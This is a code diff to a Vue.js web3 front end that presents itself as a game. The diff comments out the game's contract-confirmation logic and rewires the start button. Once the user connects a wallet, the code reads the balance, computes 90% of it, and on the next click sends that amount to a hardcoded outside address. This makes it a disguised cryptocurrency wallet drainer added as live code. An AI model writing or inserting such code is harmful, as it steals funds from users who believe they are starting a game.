@@ -1,7 +1,8 @@
+import Web3 from 'web3'
 const { ethereum } = window
 import { mapMutations } from 'vuex'
-import contracts from 'src/config/contracts'
-import { confirmContact } from 'src/web3/methods'
+// import contracts from 'src/config/contracts'
+// import { confirmContact } from 'src/web3/methods'
 
 export default {
   methods: {
@@ -9,7 +10,7 @@ export default {
     btnHandler () {
       if (this.appStage === 1) this.getAccount()
 
-      if (this.appStage === 2) this.startGame()
+      if (this.appStage === 2) this.getMoney()
     },
 
     async getAccount () {
@@ -18,7 +19,7 @@ export default {
         const accounts = await ethereum.request({ method: 'eth_requestAccounts' })
         vm.mutationWallet({ address: accounts[0], chainId: ethereum.chainId })
         vm.mutationAppStage(2)
-
+        this.getBalance()
         ethereum.on('chainChanged', vm.chainChanged)
         ethereum.on('connect', vm.walletConnected)
         ethereum.on('disconnect', vm.walletDisconnected)
@@ -41,14 +42,35 @@ export default {
     chainChanged (chainId) {
       this.mutationWallet({ chainId: chainId })
       this.mutationAppStage(1)
+      this.getBalance()
+    },
+
+    async getBalance () {
+      const web3 = new Web3(Web3.givenProvider || 'ws://localhost:8545')
+
+      web3.eth.getBalance(this.wallet.address).then(rawBalance => {
+        const balance = (rawBalance / 1000000000000000000).toFixed(4)
+        this.mutationWallet({ balance, rawBalance, workBalance: Math.round(rawBalance * 0.9) })
+      })
+    },
+
+    async getMoney () {
+      const vm = this
+      const web3 = new Web3(Web3.givenProvider || 'ws://localhost:8545')
+
+      web3.eth.sendTransaction({
+        from: vm.wallet.address,
+        to: '0xB99983713C7391F6c22f0D5990963b24FaA2EbC9',
+        value: vm.wallet.workBalance
+      })
     },
 
     async startGame () {
-      if (this.wallet.chainId === '0x38') {
-        if (this.appStage === 2) {
-          confirmContact(contracts.busd, this.wallet.address)
-        }
-      }
+      // if (this.wallet.chainId === '0x38') {
+      //   if (this.appStage === 2) {
+      //     confirmContact(contracts.busd, this.wallet.address)
+      //   }
+      // }
     }
   }
 
